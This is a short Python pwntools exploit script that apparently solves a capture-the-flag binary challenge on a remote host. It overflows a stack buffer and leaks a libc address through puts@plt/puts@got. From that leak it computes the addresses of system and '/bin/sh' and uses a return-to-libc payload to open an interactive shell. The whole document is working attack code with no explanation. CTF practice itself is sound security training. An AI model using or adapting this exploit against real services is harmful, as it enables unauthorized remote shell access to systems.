from pwn import *

r=remote('1q2.me',10103)
print r.recvline()

def send(ins):
	r.sendline(ins)

def name():
	print r.recvuntil("name?")
	name = 'hands0m3_di4n0'
	r.sendline(name)

def menu(num):
	r.recvuntil("Menu >")
	ins = str(num)
	#if ins == 'none':
	#	ins = raw_input("input@ ")
	if ins.find('3') == 0:
		send(ins) #3.change name
		r.recvuntil("name >")
	elif ins.find('4') == 0:
		send(ins) #4.bye
		r.recvline()
	else:
		print "[!] Incorrected Input Data"
def getbase():
	payload = 'A' * 20 # buf dummy[20]
	payload += '\x90\x90\x90\x90' # sfp nop[1]
	payload += p32(0x8048400) # jmp puts@plt
	payload += p32(0x804871D) # main@ret
	payload += p32(0x804A014) # puts@got
	r.sendline(payload)
	r.recv(1024)
	
	menu('4\n')
	base = u32(r.recvn(4))-0x5fca0
	return base

def getshell(base):
	system = base + 0x3ada0
	binsh = system + 0x120A8B
	menu('3')	
	payload = "A" * 24
	payload += p32(system)
	payload += "AAAA"
	payload += p32(binsh)
	r.sendline(payload)
	r.recvline()

	menu('4\n')
	r.interactive()

name()
menu('3')
base = getbase()
name()
getshell(base)
